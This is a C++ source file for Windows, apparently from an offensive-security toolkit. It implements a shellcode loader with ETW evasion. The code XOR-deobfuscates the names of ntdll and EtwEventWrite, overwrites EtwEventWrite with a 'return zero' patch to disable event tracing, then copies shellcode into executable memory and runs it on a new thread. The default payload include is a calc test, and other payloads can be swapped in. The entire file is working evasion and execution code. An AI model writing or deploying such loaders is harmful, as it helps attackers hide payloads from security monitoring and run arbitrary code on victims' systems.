#include <windows.h>
#include <cstdio>


void my_xor(unsigned char data[], int size, const unsigned char key[], int key_size)
{
	for (int i = 0; i < size; i++)
	{
		data[i] = data[i] ^ key[i % key_size];
	}
}


int main()
{

#include "functions.hpp"

#ifdef SHELLCODE_PATH
#include SHELLCODE_PATH
#else
#include "../../src/shellcodes/unobfuscated_calc.hpp"
#endif

	// Step 0 : we're gonna patch the EtwEventWrite function to avoid ETW
	// Let's first deobfuscate all the names
	my_xor(EtwEventWrite_obfuscated_function_name, sizeof(EtwEventWrite_obfuscated_function_name), EtwEventWrite_key, sizeof(EtwEventWrite_key));
	my_xor(ntdll_dll_obfuscated_function_name, sizeof(ntdll_dll_obfuscated_function_name), ntdll_dll_key, sizeof(ntdll_dll_key));

#if DEBUG
	printf("deobfuscated function names : %s (at %p), %s (at %p)\n",
		   EtwEventWrite_obfuscated_function_name,
		   EtwEventWrite_obfuscated_function_name,
		   ntdll_dll_obfuscated_function_name,
		   ntdll_dll_obfuscated_function_name);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Patch to apply
	unsigned char patch[] = { 0x48, 0x33, 0xc0, 0xc3};     // xor rax, rax; ret

#if DEBUG
	printf("The patch for the EtwEventWrite function is located at %p\n", &patch);
	printf("Hit enter to continue\n");
	getchar();
#endif

	ULONG old_protect = 0;
	size_t patch_size = sizeof(patch);

	HANDLE hcurrent_process = GetCurrentProcess();

	// get the address of the EtwEventWrite function
	void* pEtwEventWrite = (void*) GetProcAddress(GetModuleHandleA((LPCSTR) ntdll_dll_obfuscated_function_name), (LPCSTR) EtwEventWrite_obfuscated_function_name);

#if DEBUG
	printf("The EtwEventWrite is loaded at %p\n", pEtwEventWrite);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// change the protection of the memory page containing the function
	VirtualProtectEx(hcurrent_process, pEtwEventWrite, patch_size, PAGE_EXECUTE_READWRITE, &old_protect);

#if DEBUG
	printf("Changed memory protection of EtwEventWrite function to PAGE_EXECUTE_READWRITE\n");
	printf("Hit enter to continue\n");
	getchar();
#endif

	// write the patch
	memcpy(pEtwEventWrite, patch, patch_size);

#if DEBUG
	printf("Patch applied\n");
	printf("Hit enter to continue\n");
	getchar();
#endif

	// restore the protection of the memory page containing the function
	VirtualProtectEx(hcurrent_process, pEtwEventWrite, patch_size, old_protect, &old_protect);
	FlushInstructionCache(hcurrent_process, pEtwEventWrite, patch_size);

#if DEBUG
	printf("Changed back memory protection of EtwEventWrite function to its old status\n");
	printf("Hit enter to continue\n");
	getchar();
#endif

#if DEBUG
	printf("Shellcode is located at %p\n", shellcode);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 1 : Allocate the memory
	void* memory = VirtualAlloc(nullptr,
								sizeof(shellcode),
								MEM_COMMIT,
								PAGE_EXECUTE_READWRITE);

	if (memory == nullptr)
	{
		return 1;
	}

#if DEBUG
	printf("Allocated memory at %p\n", memory);
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 2 : Copy the shellcode to the allocated memory
	memcpy(memory,
		   shellcode,
		   sizeof(shellcode));

#if DEBUG
	printf("Shellcode copied to memory\n");
	printf("Hit enter to continue\n");
	getchar();
#endif

	// Step 3 : Create a thread pointing to the shellcode address
	HANDLE thread =	CreateThread(nullptr,
				 0,
				 (LPTHREAD_START_ROUTINE) memory,
				 nullptr,
				 0,
				 nullptr);

	if (thread == nullptr)
	{
		return 1;
	}

	// Wait for the thread to finish
	WaitForSingleObject(thread, INFINITE);

	return 0;
}
